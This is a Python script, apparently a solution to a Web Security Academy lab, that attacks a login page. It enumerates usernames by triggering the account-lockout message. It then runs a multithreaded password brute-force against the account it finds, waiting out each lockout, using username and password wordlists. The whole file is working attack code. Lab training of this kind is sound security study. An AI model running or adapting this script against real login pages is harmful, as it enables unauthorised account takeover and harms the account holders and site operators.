import time
import requests
from queue import Queue
import threading

server_name = "0a4900b90465c13a82de2e3a00ed0064"

url = f"https://{server_name}.web-security-academy.net/login"
headers = {
    "Host": f"{server_name}.web-security-academy.net",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": url,
    "Referer": url,
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers",
    "Connection": "keep-alive"
}

username_queue = Queue()
password_list = []
found = threading.Event()

def bruteForce():
    session = requests.session()
    response = ""
    username = ""

    while not username_queue.empty() and not found.is_set():
        username = username_queue.get()
        data = f"username={username}&password=asd"

        print(f"[-] Trying {username}")
        for _ in range(4):
            response = session.post(url, headers=headers, data=data, allow_redirects=False)

        if b"Invalid username or password" in response.content:
            pass
        else:
            found.set()
            time.sleep(2)
            print(f"\n[*] Found: {username}\n")

            for password in password_list:
                data = f"username={username}&password={password}"
                print(f"[-] Trying {username} : {password}")

                while True:
                    response = session.post(url, headers=headers, data=data, allow_redirects=False)
                    if b"You have made too many incorrect login attempts" in response.content:
                        time.sleep(10)
                    elif b"Invalid username or password" in response.content:
                        break
                    else:
                        print(f"\n[*] Found {username} : {password}")
                        exit(0)


def main1():
    threads = []
    num_of_threads = 10

    # Put the usernames in a Queue
    with open('../../credentials/usernames.txt', 'r') as file:
        for line in file:
            username_queue.put(line.strip('\n'))

    # Put the passwords in a Queue
    with open('../../credentials/passwords.txt', 'r') as file:
        for line in file:
            password_list.append(line.strip('\n'))

    for _ in range(num_of_threads):
        t = threading.Thread(target=bruteForce)
        t.start()
        threads.append(t)



if __name__ == '__main__':
    main1()
